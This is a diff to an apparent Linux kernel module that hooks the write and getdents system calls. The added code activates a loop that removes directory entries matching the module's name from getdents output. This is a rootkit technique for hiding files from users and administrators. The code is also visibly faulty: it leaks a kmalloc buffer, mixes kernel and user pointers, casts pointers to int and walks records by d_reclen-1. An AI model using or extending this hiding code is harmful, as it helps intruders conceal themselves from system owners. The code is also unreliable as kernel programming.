@@ -37,27 +37,31 @@ asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s)
  */
 asmlinkage long custom_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
 {
-    asmlinkage long tmp = (*original_getdents)(fd, dirp, count);
-    struct linux_dirent64 __user *new_dir = dirp;
+    unsigned int tmp, i;
+    struct linux_dirent64 __user *new_dir;
+
+    tmp = (*original_getdents)(fd, dirp, count);
+    new_dir = (struct linux_dirent64 __user *) kmalloc(tmp, GFP_KERNEL);
+    memcpy(new_dir, dirp, tmp);
     //char hide[] = "ker_mod";
-    unsigned int i = 0;
+    i = 0;
     printk(KERN_ALERT "test: %u\n", count);
-    // while (i < count) {
-    //     /*if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
-    //         printk(KERN_ALERT "test 1. %s\n", new_dir->d_name);
-    //         int reclen = new_dir->d_reclen;
-    //         char* next_rec = (char *)new_dir + reclen;
-    //         printk(KERN_ALERT "test new_dir: %s\n", next_rec);
-    //         int len = (int)dirp + tmp - (int)next_rec;
-    //         memmove(new_dir, next_rec, len);
-    //         printk(KERN_ALERT "test 2. %s\n", new_dir->d_name);
-    //         tmp -= reclen;
-    //         continue;
-    //     }*/
-    //     i += new_dir->d_reclen-1;
-    //     new_dir = (struct linux_dirent64*)((char *)dirp + new_dir->d_reclen-1);
-    //     printk(KERN_ALERT "test next: %s\n", new_dir->d_name);
-    // }
+    while (i < count) {
+        if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
+            printk(KERN_ALERT "test 1. %s\n", new_dir->d_name);
+            int reclen = new_dir->d_reclen;
+            char* next_rec = (char *)new_dir + reclen;
+            printk(KERN_ALERT "test new_dir: %s\n", next_rec);
+            int len = (int)dirp + tmp - (int)next_rec;
+            memmove(new_dir, next_rec, len);
+            printk(KERN_ALERT "test 2. %s\n", new_dir->d_name);
+            tmp -= reclen;
+            continue;
+        }
+        i += new_dir->d_reclen-1;
+        new_dir = (struct linux_dirent64*)((char *)dirp + new_dir->d_reclen-1);
+        printk(KERN_ALERT "test next: %s\n", new_dir->d_name);
+    }
     return tmp;
 }
 
